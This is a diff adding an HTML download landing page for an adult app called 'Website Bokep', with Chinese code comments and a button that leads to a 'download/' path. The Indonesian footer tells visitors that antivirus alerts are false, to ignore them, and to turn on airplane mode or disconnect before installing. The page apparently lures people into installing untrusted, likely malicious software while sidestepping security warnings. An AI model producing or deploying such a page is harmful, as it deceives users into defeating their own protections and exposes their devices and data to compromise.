@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <base href="/landing-pages/bokepx/">
+
+<meta charset="UTF-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Website Bokep</title>
+  <meta name="robots" content="index, follow">
+  <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Cache-Control" content="no-cache">
+  <!-- 修复了网页图标 404 报错 -->
+  <link rel="shortcut icon" href="static/picture/logo.jpg" type="image/x-icon">
+
+  <link rel="stylesheet" href="static/css/style.css">
+  <link rel="stylesheet" href="static/css/phone.css">
+  
+  <script src="static/js/jquery.min.js"></script>
+  
+  <style>
+    header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .site-title {
+      display: inline-block;
+      margin: 0;
+      padding: 0;
+      font-size: 13px;
+      font-weight: 700;
+      letter-spacing: 0.2px;
+      color: #fff;
+      background: transparent;
+      box-shadow: none;
+    }
+
+    .download-btn {
+      display: block;
+      width: 62%;
+      max-width: 280px;
+      margin: 0 auto 58px;
+      padding: 12px 14px;
+      border: 1.5px solid #fff;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 700;
+      color: #fff;
+      background: transparent;
+      box-shadow: 0 0 0 1px rgba(255, 255, 255, 0.08);
+      cursor: pointer;
+    }
+
+    .tip-text {
+      width: 100%;
+      margin: 0;
+      padding: 6px 10px;
+      border-radius: 0;
+      font-size: 8px;
+      line-height: 1.35;
+      color: #fff;
+      background: rgba(0, 0, 0, 0.45);
+      text-align: center;
+      position: fixed;
+      left: 0;
+      bottom: 0;
+      z-index: 20;
+      box-sizing: border-box;
+    }
+  </style>
+  <script src="/landing-runtime.js" defer></script>
+</head>
+
+<body>
+  <header style="justify-content: flex-start;">
+<img src="static/picture/logo.jpg" style="margin-right:2px;">
+	  <div class="site-title">Website Bokep</div>
+  </header>
+
+  <main>
+    <img src="static/picture/title-111.png" class="download" style="cursor: pointer;">
+  </main>
+
+  <footer style="width: 100%;">
+    <div class="box"></div>
+    <button type="button" class="download download-btn">Unduh Sekarang</button>
+
+    <p class="tip-text">Aplikasi ini termasuk dalam industri khusus. Terkadang dapat muncul peringatan virus secara keliru. Jika muncul peringatan, silakan klik abaikan lalu aktifkan mode pesawat atau putuskan jaringan sebelum melakukan instalasi.</p>
+  </footer>
+
+<script>
+  $(window).on('resize orientationchange', () => {
+    $('body').height(window.innerHeight);
+  });
+
+  $(document).ready(function() {
+    $('.download').on('click', function() {
+      // 下载跳转路径已修改为 download/
+      window.location.href = 'download/';
+    });
+  });
+</script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"d8d0a4b6e3294b56990fe4f7e7e0a13a","r":1}' crossorigin="anonymous"></script>
+</body>
+</html>
